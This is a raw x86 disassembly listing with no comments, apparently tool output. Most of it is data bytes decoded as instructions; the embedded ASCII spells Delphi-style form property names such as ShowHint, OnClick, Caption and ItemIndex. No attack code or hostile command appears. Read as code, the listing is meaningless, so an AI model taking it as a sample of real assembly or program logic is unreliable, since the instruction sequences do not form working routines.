add [ eax ] al
sbb eax 0x61500e00
outsb
je r-xdata
jb r-xdata
jne r-xdata
outsb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
adc [ eax ] al
or eax [ ebx + 0x6f ]
int3
movsb [ edi ] [ esi ]
add [ eax ] eax
call [ eax ]
cmc
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
pop es
push esp
popad
bound edx [ ebx + 0x74 ]
outsd
jo r-xdata
outsb
jne r-xdata
outsb
outsd
xor eax [ eax + eax + 0x10 ]
inc eax
add [ ecx ] bl
add bh bh
and [ esp + eax * 2 + 0x100 ] cl
jb r-xdata
add [ edx ] cl
push eax
popad
outsd
insb
outsd
jb r-xdata
je r-xdata
outsb
add [ fs : eax ] dl
inc eax
add [ eax ] ah
add bh bh
insb
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb [ eax ] eax
push cs
push eax
popad
jb r-xdata
inc esp
add [ eax - 0x55 ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] 0x14656c62
push esi
inc ecx
add [ eax ] ah
add [ eax ] eax
jmp [ eax ]
adc [ eax ] al
push edi
add [ eax ] al
call [ edx + ecx * 4 ]
adc [ eax ] al
cdq
add [ eax ] al
inc [ esp + ecx * 4 + 0x44 ]
add [ esp + ecx * 4 ] cl
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
hlt
push 0x6948776f
outsb
je r-xdata
push 0x6948776f
outsb
je r-xdata
add [ eax - 0x80000000 ] al
pop ds
add [ eax ] cl
push ebx
outsb
je r-xdata
adc [ eax ] al
test eax 0x4cff0001
hlt
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
or dl [ eax + 0x61 ]
outsb
je r-xdata
add [ eax - 0x80000000 ] al
and eax [ eax ]
pop es
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and al 0x0
push cs
dec edi
outsb
inc ebx
outsd
outsb
je r-xdata
cmp eax [ eax + eax + 0x78 ]
je r-xdata
outsb
jpo r-xdata
jo r-xdata
or [ eax + 0x6f ] edx
outsd
outsb
je r-xdata
add [ eax ] al
add [ ebx ] bl
add [ ebx ] cl
push eax
popad
imul eax [ ecx + ebp * 2 + 0x4d ] r--data
adc [ eax ] al
pop edx
add [ eax ] al
add [ eax ] al
js r-xdata
add [ eax + eax ] bh
[ edx + ecx * 4 + 0x10044 ]
adc [ eax ] al
0x68ff0000 0x448c
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
in al dx
jo r-xdata
mov al 0x40
push eax
outsd
jo r-xdata
inc edi
je r-xdata
adc al 0x56
inc ecx
add al al
add [ eax ] eax
inc eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc ebx
insb
inc esp
add [ eax - 0x4700ffff ] bh
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x4f ] bp
jbe r-xdata
inc eax
outsb
inc ebp
outsb
inc esp
jb r-xdata
dec edi
jb r-xdata
add [ eax ] eax
jo r-xdata
pop eax
cmp eax 0xe00044
add bh bh
loopne r-xdata
imul esi [ ebp + 0x49 ] 0x586f666e
cmp eax 0xd00044
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ ebx ] cl
dec edi
outsb
jb r-xdata
add [ eax - 0x80000000 ] al
sub [ eax ] eax
or cl [ edi + 0x6e ]
inc esp
jb r-xdata
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
outsd
arpl [ ebx + 0x44 ] bp
jb r-xdata
push [ eax + 0x1ff0001 ]
inc esp
jb r-xdata
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0029 ] al
outsb
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe942a2c1
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0026 ] al
outsb
inc esp
jb r-xdata
add [ eax ] al
and [ 0x6e4f0a00 ] 0x44
bound ebp [ ebx + eax * 2 + 0x6c ]
push esi
inc ecx
add [ eax ] ch
add [ eax ] eax
[ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] eax
or [ edi + 0x6e ] ecx
dec ebp
outsd
jne r-xdata
arpl [ ebx - 0x5c ] bp
aas
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc esp
outsd
ja r-xdata
add [ eax ] al
sub [ 0x6e4f0600 ] 0x45
js r-xdata
push esi
inc ecx
add al cl
add [ eax ] eax
dec eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f06002d ] al
add [ eax + 0x4f07002c ] al
add [ eax ] al
dec edi
jbe r-xdata
jb r-xdata
jo r-xdata
shl ah 0xa4
inc ebx
add [ ebx ] al
or edx [ esp + edx * 2 + 0x65 ]
js r-xdata
push ebp
jo r-xdata
or [ ebx + 0x74 ] dl
inc ebx
jb r-xdata
sar [ 0xd80044 ] 0x1
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
xor [ eax ] al
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
je r-xdata
outsb
inc ebp
outsb
je r-xdata
aas
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002b ] al
aas
inc esp
add [ eax ] cl
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x14 ] bp
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
inc eax
inc esp
add [ eax - 0x4f00ffff ] dh
add [ eax ] eax
inc [ ecx ]
add [ eax ] ch
xor al [ eax ]
inc esp
dec esp
popad
jns r-xdata
dec ebp
outsd
jne r-xdata
inc ecx
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0032 ] al
outsb
push ebx
je r-xdata
add [ ebx + ecx + 0x42 ] bh
insb
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax - 0x5a ] al
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmpsb [ esi ] [ edi ]
inc ebx
add [ esi ] ch
inc ebx
add [ ecx + eax + 0x4f9c0000 ] cl
inc esp
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
inc esp
jb r-xdata
popad
dec ebp
outsd
jbe r-xdata
outsb
inc ebp
push es
dec edi
inc ecx
inc esp
add al dl
add [ eax ] eax
call eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0d002e ] al
outsb
add [ ebx + ebx * 8 + 0x7efc0043 ] bl
inc esp
add [ esi + ecx - 0x2883ffbe ] ah
inc ebx
add [ eax - 0x66 ] bh
inc esp
add [ edx + ebx * 4 + 0x44 ] dh
add [ ebx + ebx * 4 + 0x44 ] al
add [ eax ] bh
jle r-xdata
add ah bl
mov [ eax + eax - 0x64 ] al
inc esp
jne r-xdata
je r-xdata
jb r-xdata
add [ eax + 0x1c004480 ] dh
nop
add [ ebp + eax * 4 + 0x44 ] bh
add al ah
test [ eax + eax + 0x8 ] al
mov es [ eax + eax - 0x80 ]
jge r-xdata
outsb
push ebx
je r-xdata
dec edi
insb
movsd [ edi ] [ esi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
je r-xdata
inc eax
inc ecx
inc esp
add al dh
add [ eax ] eax
push eax
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f080034 ] al
outsb
push ebp
outsb
inc esp
outsd
arpl [ ebx - 0x75 ] bp
xor al [ eax ]
add [ 0xffffffffabe80045 ] 0x44
add al ah
add [ eax ] eax
add [ eax ] al
add [ edx ] al
add [ eax ] al
add al ah
movsb [ edi ] [ esi ]
add [ eax ] al
add [ eax ] al
add al [ eax ]
add [ eax ] al
loopne r-xdata
je r-xdata
inc esp
outsd
add [ edx ] dl
mov al 0xe
mov al 0x6
mov al 0x13
mov al 0x14
mov al 0xc7
inc esi
[ esp + ebx * 8 - 0x2337ffbd ]
add [ edi ] al
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
add [ ebp + ebp * 4 - 0x2463ffbc ] ch
inc ebx
add ah bh
jle r-xdata
or [ esp + ebp * 2 + 0x42 ] dh
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0033 ] al
inc ebx
add [ 0x6f546c74 ] al
jo r-xdata
add [ ecx + ecx * 4 ] cl
inc ecx
add [ edx + ebx * 8 - 0x2383ffbd ] dl
inc ebx
outsb
je r-xdata
add al cl
fadd [ ebx ]
loopne r-xdata
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax + 0x74 ]
popfd
inc esp
add [ eax ] dh
scasb [ edi ]
inc esp
add al cl
pop [ eax + eax + 0x3c ]
nop
inc esp
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
inc edx
pushfd
outsd
insd
lahf
inc esp
jb r-xdata
inc esp
add [ eax + 0x140043d9 ] bl
fadd [ ebx ]
pop es
inc ebx
add [ ebp + ebx * 8 + 0x43 ] bh
add [ eax - 0x4fffbc23 ] ah
fiadd [ ebx ]
sub al bl
inc ebx
add [ esp + edx * 2 ] cl
inc ebx
jne r-xdata
je r-xdata
sub [ edx ] dh
inc eax
add [ edx + esi + 0x40 ] al
add [ eax - 0x17ffbafb ] al
stosd [ edi ]
inc esp
je r-xdata
jl r-xdata
outsd
je r-xdata
inc edx
add [ ebx + ebx * 8 + 0x7efc0043 ] bl
inc esp
add ah bl
mov [ eax + eax - 0x64 ] al
push cs
inc edx
add [ ebx + ecx + 0xb7c0042 ] al
add al ah
lahf
inc esp
inc esp
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
add [ 0xffffffffabe80045 ] 0x44
insd
dec esp
popad
bound esp [ ebp + 0x6c ]
lea eax [ eax ]
inc eax
cmpsb [ esi ] [ edi ]
inc ebx
add [ edi ] al
or al 0x54
inc ebx
jne r-xdata
add [ eax ] cl
lahf
inc eax
inc ebx
add [ eax ] dh
jg r-xdata
add [ edi ] al
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
inc ebx
je r-xdata
add [ eax + 0x1c004480 ] dh
nop
inc esp
add [ eax + 0x140043d9 ] bl
fadd [ ebx ]
push es
add [ ebp + eax * 4 + 0x44 ] bh
add al ah
test [ eax + eax + 0x8 ] al
mov es [ eax + eax - 0x80 ]
jge r-xdata
mov [ ecx ] eax
xchg esp eax
fiadd [ ebx ]
je r-xdata
add [ eax + 0x448c ] dh
add [ eax ] dl
inc eax
add [ ebp + 0x1 ] ch
add bh bh
pop esp
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
push cs
add [ eax ] cl
inc ecx
jne r-xdata
insb
jae r-xdata
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
nop
push eax
cmpsd [ esi ] [ edi ]
inc ebx
add [ edi ] al
push es
push esp
dec esp
popad
bound esp [ ebp + 0x6c ]
add [ esi ] al
add [ ebp + edi * 2 - 0x527fffbc ] al
inc esp
add [ ebp + ebp * 4 - 0x2463ffbc ] ch
inc ebx
add ah bh
jle r-xdata
inc eax
inc ebx
add [ eax ] dh
jg r-xdata
add [ ecx + ecx * 4 ] cl
inc ecx
add [ edx + ebx * 8 - 0x2383ffbd ] dl
insd
dec esp
popad
bound esp [ ebp + 0x6c ]
insb
movsd [ edi ] [ esi ]
inc ebx
add [ eax + 0xb004450 ] dl
add [ eax ] cl
push ebx
je r-xdata
inc ecx
add [ edi ] bl
add bh bh
jo r-xdata
cmp al 0x44
add [ eax + eax ] dh
dec eax
scasd [ edi ]
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0012 ] al
outsd
outsb
jae r-xdata
outsd
push ebx
imul edi [ edx + 0x65 ] r-xdata
pop edi
add [ eax ] al
push [ eax ]
add bh bh
sbb bl 0x43
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
or al 0x0
or [ ecx + 0x6c ] eax
imul esp [ edi + 0x6e ] 0x746e656d
hlt
add al al
xor al 0x44
add [ ebx ] bl
add bh bh
or [ eax + 0x10044 ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
or eax [ eax ]
add eax 0x67696c41
outsb
pop eax
push esp
inc ecx
add [ ecx + eax ] ch
inc [ eax + 0x10043db ]
mov al 0xa6
inc ebx
add [ esi ] bh
inc ebx
add [ edx ] dh
add [ eax ] cl
push ebx
je r-xdata
insb
add [ eax - 0x76 ] dl
inc esp
add al cl
mov [ eax + eax - 0x24 ] eax
mov [ eax + eax - 0x78 ] es
mov eax [ eax + eax + 0x74 ]
popfd
inc esp
add [ eax ] dh
scasb [ edi ]
inc esp
add al cl
pop [ eax + eax + 0x3c ]
nop
inc esp
jl r-xdata
inc ebx
je r-xdata
add dh bh
sbb [ esp + eax * 2 ] cl
add [ eax ] 0x0
add [ eax + 0x4208000f ] al
imul eax [ ecx + ebp * 2 + 0x4d ] 0x9065646f
cmp eax [ eax + eax - 0xc ]
mov al [ eax + eax + 0x24 ]
mov eax [ eax + eax - 0x10 ]
stosb [ edi ]
inc esp
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43070010 ] al
popad
jo r-xdata
add [ eax ] dl
add dh bh
add [ fs : eax ] al
jb r-xdata
add bh bh
fwait
add [ eax ] al
inc [ ecx ]
imul ebp [ edi + 0x6e ] sub_421d60
jo r-xdata
or eax [ edx ]
jl r-xdata
insb
jae r-xdata
add [ eax ] al
add [ 0x72440800 ] dl
popad
dec ebp
outsd
add [ gs : eax ] dl
imul ebp [ esi + 0x74 ] 0x4434a873
add [ edx ] bh
add bh bh
jpe r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x43050011 ] al
outsd
insb
outsd
jb r-xdata
add bh bh
xchg esp eax
mov [ eax + eax - 0x50 ] es
mov [ eax + eax ] es
add [ eax ] bh
jle r-xdata
0x9a740044 0x44
inc esp
fwait
inc esp
inc edx
add [ esi + ecx - 0x2883ffbe ] ah
inc ebx
add [ eax - 0x66 ] bh
inc esp
add [ edx + ebx * 4 + 0x44 ] dh
add [ ebx + ebx * 4 + 0x44 ] al
add [ eax ] cl
lahf
add [ eax + r-xdata ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
push eax
cmpsd [ esi ] [ edi ]
inc ebx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edi + 0x43 ] al
add [ eax + 0x20000001 ] dl
movsd [ edi ] [ esi ]
inc ebx
add [ esi + ecx + 0x34cc0042 ] al
inc eax
add al bl
pop es
inc edx
add ah dl
xor al 0x40
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0xc ] al
adc eax [ eax ]
or al [ edx + esi * 2 + 0x61 ]
inc ebx
jne r-xdata
inc esp
fild [ ebx ]
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
pop ss
add [ esi + eax * 2 ] cl
outsd
arpl [ ebp + 0x73 ] si
inc ebx
outsd
outsb
je r-xdata
jae r-xdata
inc eax
add [ ecx ] bl
add bh bh
and [ esp + eax * 2 + 0x100 ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb eax [ eax ]
or dl [ eax + 0x61 ]
jb r-xdata
outsd
insb
add [ edx ] ah
inc edx
add [ eax ] ch
add bh bh
call 0xfffffffff843edcd
mov eax [ eax + eax ]
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x46040018 ] al
outsd
outsb
je r-xdata
add bh bh
jb r-xdata
add [ eax + 0x1 ] al
outsb
je r-xdata
adc [ eax ] al
pushad
add [ eax ] al
[ eax + eax ]
inc eax
add [ gs : eax ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
adc al 0x0
or [ edx + esi * 2 + 0x61 ] al
dec ebx
imul ebp [ esi + 0x64 ] r-xdata
pop ebp
add [ eax ] al
jmp [ eax ]
cmp eax [ eax + eax - 0x65 ]
add [ eax ] al
[ ebx + 0x1ff0000 ]
adc [ eax ] al
mov eax 0xf40043db
or [ eax + 0x6f ] edx
jo r-xdata
outsd
outsb
je r-xdata
add [ eax ] eax
jmp [ eax ]
popad
jb r-xdata
je r-xdata
jo r-xdata
adc [ eax ] al
0x68ff0000 0x448c
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
sbb al 0x0
push cs
push eax
popad
jb r-xdata
jb r-xdata
outsb
fild [ ebx ]
mov [ ecx ] al
add bh bh
add [ eax ] al
add [ eax - 0x80000000 ] al
and [ eax ] al
or edx [ edx + esi * 2 + 0x61 ]
outsb
jae r-xdata
add ah dh
movsb [ edi ] [ esi ]
inc ebx
add [ esi + 0x1 ] ch
add bh bh
cmp ah bl
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and [ eax ] eax
push es
dec esp
popad
jns r-xdata
je r-xdata
outsb
jne r-xdata
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x5308001f ] al
push 0x6948776f
outsb
add [ eax ] al
outsb
add [ eax ] al
and [ esi ] 0x0
or cl [ edi + 0x6e ]
inc esp
bound ebp [ ebx + eax * 2 + 0x6c ]
imul esp [ ebx + 0x6b ] r-xdata
call 0xffffffffe942ab65
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0027 ] al
outsb
inc esp
jb r-xdata
jo r-xdata
add bh bh
xor [ ecx ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
and eax 0x6e4f0e00
jne r-xdata
adc [ eax ] al
jo r-xdata
inc eax
add [ ecx + 0x44ff0000 ] bl
mov [ eax + eax + 0xc ] es
mov [ eax + eax ] es
add [ eax ] dl
push 0x6948776f
outsb
je r-xdata
add [ eax ] 0x0
add [ eax + 0x4f09002a ] al
outsb
inc ebp
outsb
inc esp
jb r-xdata
inc esp
jb r-xdata
add [ eax ] al
and [ eax + eax ] 0x7
dec edi
outsb
inc ebx
insb
imul esp [ ebx + 0x6b ] r-xdata
xor [ ecx ] al
push esi
inc ecx
add [ eax ] ah
add [ eax ] al
js r-xdata
inc ebx
outsd
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0025 ] al
outsb
add [ eax ] dl
inc eax
add [ edi ] dl
add bh bh
adc al 0x8a
inc esp
add [ eax - 0x55 ] dh
inc esp
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
and al [ eax ]
pop es
push esi
imul esi [ ebx + 0x69 ] r--data
adc [ eax ] al
outsd
add [ eax ] eax
call [ esp + ebx * 8 + 0x43 ]
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax ] al
and eax [ eax ]
or [ edi + 0x6f ] dl
jb r-xdata
push ds
add [ 0x776f6853 ] cl
inc ecx
arpl [ ebx + 0x65 ] sp
insb
add bh bh
fcomp st3
inc ebx
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx ] 0x0
add [ eax ] al
je r-xdata
outsb
jpo r-xdata
add [ eax ] al
add [ eax + 0x4f09002d ] al
outsb
pop eax
cmp eax 0xd00044
add bh bh
rol [ eax ] 0x1
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax [ eax ]
or ecx [ edi + 0x6e ]
jo r-xdata
dec ebp
outsd
jne r-xdata
add [ eax ] al
add [ eax + 0x4f0b002b ] al
dec edi
jbe r-xdata
in al dx
push eax
outsd
jo r-xdata
push edi
inc ebx
push 0x10007261
add [ eax + eax ] bh
[ edx + ecx * 4 + 0x10044 ]
inc esp
outsd
arpl [ ebx - 0x5c ] bp
aas
inc esp
add [ eax ] dl
add [ eax ] eax
call [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0031 ] al
outsb
push ebp
jo r-xdata
je r-xdata
inc esp
outsd
ja r-xdata
[ eax ]
add [ eax + 0x4f0a0028 ] al
outsb
inc esp
add al dh
add [ eax ] al
push eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
outsb
jb r-xdata
add [ eax ] eax
dec [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f090029 ] al
outsb
inc ebp
outsb
inc esp
outsd
arpl [ ebx - 0x14 ] bp
aas
inc esp
add [ eax ] bl
add [ eax ] eax
[ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
je r-xdata
jb r-xdata
add [ eax ] al
sub [ esi ] 0x0
or al 0x4f
outsb
dec ebp
outsd
jne r-xdata
push esi
inc ecx
add [ eax - 0x7f00ffff ] al
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002e ] al
push ebx
je r-xdata
xor [ ecx ] 0x0
or ecx [ edi + 0x6e ]
jb r-xdata
sar [ 0xd80044 ] 0x1
add bh bh
fadd [ eax ]
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub al 0x0
or ecx [ edi + 0x6e ]
dec ebp
outsd
jne r-xdata
inc esp
jb r-xdata
add [ eax - 0x80000000 ] al
sub [ eax ] al
or cl [ edi + 0x6e ]
aas
inc esp
add [ eax ] cl
push esi
inc ecx
add [ eax ] ch
add [ eax ] eax
cmp al 0x10
add [ edi + ecx * 2 + 0x44 ] dh
insb
lodsd [ esi ]
inc ebx
inc esp
jb r-xdata
inc ebp
outsb
add [ eax ] al
sub [ edi ] 0x0
push esi
inc ecx
add [ eax + 0x1 ] bh
add bh bh
js r-xdata
popad
jbe r-xdata
dec ebp
outsd
jbe r-xdata
jb r-xdata
inc ecx
add al dh
mov [ ecx ] eax
test al 0x95
inc ecx
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add [ eax ] al
add [ eax ] dl
pushad
inc ecx
jb r-xdata
add [ eax + edx ] bh
inc eax
add [ eax ] al
add [ eax ] al
add [ ecx - 0x3f74ffc0 ] dl
inc esp
cld
lodsb [ esi ]
inc ebx
add [ eax ] cl
push cs
push esp
inc esp
jb r-xdata
push edi
imul ebp [ esi + 0x43 ] 0x72746e6f
dec esp
outsb
dec ebp
outsd
jne r-xdata
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0c002f ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
das
add [ edi + ecx * 2 ] cl
outsd
outsb
je r-xdata
lodsb [ esi ]
inc ecx
inc esp
add [ eax ] al
add [ eax ] eax
inc [ eax ]
add [ eax ] eax
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0b0030 ] al
outsb
push ebx
je r-xdata
or al 0x4f
pop eax
cmp eax 0xe00044
add bh bh
loopne r-xdata
dec eax
imul esp [ gs : edi + 0x68 ] 0x6e490774
push es
add [ edx + esi + 0x40 ] al
add [ eax - 0x6d ] dh
inc ebx
add [ eax + ebx * 4 - 0x624bffbf ] cl
inc ecx
add [ eax - 0x22 ] bl
inc ebx
add [ eax - 0x61 ] dl
inc ecx
add al bl
lahf
inc ecx
add [ edi + ebx * 8 - 0x5e33ffbd ] cl
inc ecx
add [ eax - 0x3bffbe6d ] ah
xchg ebx eax
inc ecx
add al ch
xchg ebx eax
inc ecx
add ah dl
fiadd [ ebx ]
inc esp
fild [ ebx ]
inc esp
xchg edi eax
inc ecx
add [ eax ] bh
cwde
inc ecx
add [ edi + ebx * 8 + 0x43 ] ah
add ah cl
0x9ba00041 0x41
int3
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x140043ae ] dl
dec ecx
je r-xdata
add [ eax ] cl
adc [ ebp + ecx * 2 + 0x65 ] edx
popad
popad
inc eax
add [ ebx + 0x43ad6cc0 ] cl
ja r-xdata
adc [ edx + edx * 2 ] al
dec ecx
outsb
jb r-xdata
outsd
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
outsb
je r-xdata
je r-xdata
jb r-xdata
dec ebp
outsd
jne r-xdata
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
sub eax 0x6e4f0900
add [ eax + 0x7c004194 ] ah
fiadd [ ebx ]
sub al 0x98
inc ecx
add ah al
fld [ ebx ]
loopne r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
insd
inc ebp
jbe r-xdata
jb r-xdata
je r-xdata
jb r-xdata
je r-xdata
outsd
jb r-xdata
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
jo r-xdata
shl [ eax + eax * 2 ] 0x1
insb
or edx [ edi + edx * 2 + 0x69 ]
outsb
inc ebx
outsd
jb r-xdata
outsd
insb
add [ 0x65646e49 ] al
js r-xdata
popad
je r-xdata
add [ eax ] al
nop
scasb [ edi ]
inc ebx
add [ eax + eax ] dl
add [ eax ] al
adc [ eax + 0x41 ] ah
outsb
je r-xdata
je r-xdata
ja r-xdata
insd
inc ebp
jbe r-xdata
push 0x6e490774
andps xmm1 [ edi + 0x77 ]
outsb
jb r-xdata
add [ esi ] eax
dec ecx
outsb
je r-xdata
arpl [ gs : ebp + eax + 0x54 ] si
push edx
arpl [ gs : eax + eax + 0x5 ] si
push ebx
je r-xdata
add al 0x52
inc eax
sub [ edx ] dh
insb
add [ 0x65646e49 ] al
js r-xdata
inc eax
add [ eax + edx ] bh
inc eax
add [ ebx + 0x43ae10c0 ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ebp * 4 + 0x43 ] ch
add [ eax ] al
add [ eax ] al
inc esp
add [ eax + edx ] bh
add ecx [ eax ]
pop es
inc ebx
outsd
outsb
je r-xdata
je r-xdata
jae r-xdata
dec ebp
popad
outsb
je r-xdata
outsb
je r-xdata
jb r-xdata
inc eax
outsd
jb r-xdata
add al 0x8
pop es
inc ebx
sub_43b2ac
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
mov dl 0x43
add [ edi ] al
andps xmm0 [ ebx + 0x75 ]
jae r-xdata
inc ebx
add [ eax + eax ] ch
add [ eax ] al
in al dx
dec eax
inc esp
add al al
xor al 0x40
add ah cl
xor al 0x40
add al dl
xor al 0x40
add ah dl
xor al 0x40
add al cl
xor al 0x40
add [ eax ] ch
xor al [ eax ]
inc esp
xor al [ eax ]
jo r-xdata
add [ eax + 0x7a ] bl
inc esp
add al bl
outsd
insd
inc ebx
outsd
insd
bound ebp [ edi + 0x42 ]
outsd
js r-xdata
cmovb eax [ eax ]
add al 0x7b
inc edx
add [ esp + edi * 8 + 0xfa40043 ] ch
